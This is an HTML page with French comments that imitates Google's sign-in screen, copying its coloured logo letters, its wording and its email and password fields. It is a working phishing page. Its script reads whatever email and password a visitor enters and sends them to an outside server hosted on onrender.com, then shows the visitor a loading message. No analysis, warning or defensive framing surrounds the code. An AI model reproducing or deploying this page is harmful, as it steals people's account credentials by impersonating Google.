<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>S.A</title>
  <style>
    body {
      font-family: 'Roboto', Arial, sans-serif;
      background-color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      width: 380px;
      border: 1px solid #dadce0;
      border-radius: 8px;
      padding: 40px 30px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      text-align: center;
    }

    .multicolor span {
      font-weight: bold;
      font-size: 40px;
    }

    h2 {
      font-weight: 400;
      margin-top: 20px;
      font-size: 22px;
    }

    p {
      font-size: 14px;
      color: #5f6368;
      line-height: 1.5;
    }

    input[type="email"], input[type="password"] {
      width: 100%;
      height: 50px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      padding: 0 10px;
      margin-top: 10px;
      outline: none;
    }

    input:focus {
      border: 2px solid #1a73e8;
    }

    a {
      color: #1a73e8;
      text-decoration: none;
      font-weight: 500;
    }

    a:hover {
      text-decoration: underline;
    }

    .actions {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 30px;
    }

    .btn {
      padding: 10px 25px;
      background: #1a73e8;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: 500;
      cursor: pointer;
    }

    .btn:hover {
      background: #1669c1;
    }

    #response {
      margin-top: 20px;
      font-weight: bold;
      color: green;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1 class="multicolor">
      <span style="color: royalblue;">G</span>
      <span style="color: red;">o</span>
      <span style="color: gold;">o</span>
      <span style="color: royalblue;">g</span>
      <span style="color: green;">l</span>
      <span style="color: red;">e</span>
    </h1>

    <h2>Sign in</h2>
    <p>Use your Google Account. The account will be added to this device and available to other Google apps.</p>

    <!-- Formulaire sans action, on gère via JS -->
    <form id="loginForm">
      <input type="email" id="Email" placeholder="Email or phone" required>
      <div style="text-align: left; margin-top: 8px;">
        <a href="#">Forgot email?</a>
      </div>

      <input type="password" id="password" placeholder="Password" required>
      <div style="text-align: left; margin-top: 8px;">
        <a href="#">Forgot password?</a>
      </div>

      <div class="actions">
        <a href="#">Create account</a>
        <button type="submit" class="btn">Next</button>
      </div>
    </form>

    <div id="response"></div>
  </div>

  <script>
    const form = document.getElementById("loginForm");
    const responseDiv = document.getElementById("response");

    form.addEventListener("submit", (e) => {
      e.preventDefault(); // Empêche le rechargement de la page

      const email = document.getElementById("Email").value;
      const password = document.getElementById("password").value;

      // <-- Remplace cette URL par ton serveur Flask réel
      fetch("https://serveur-flask-6qqm.onrender.com/api/test", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: email, password: password })
      })
      .then(res => res.json())
      .then(data => {
        responseDiv.textContent = "Chargement ... " + data.message;
      })
      .catch(err => {
        console.error("Erreur :", err);
        responseDiv.textContent = "Erreur de connexion au serveur";
      });
    });
  </script>
</body>
</html>
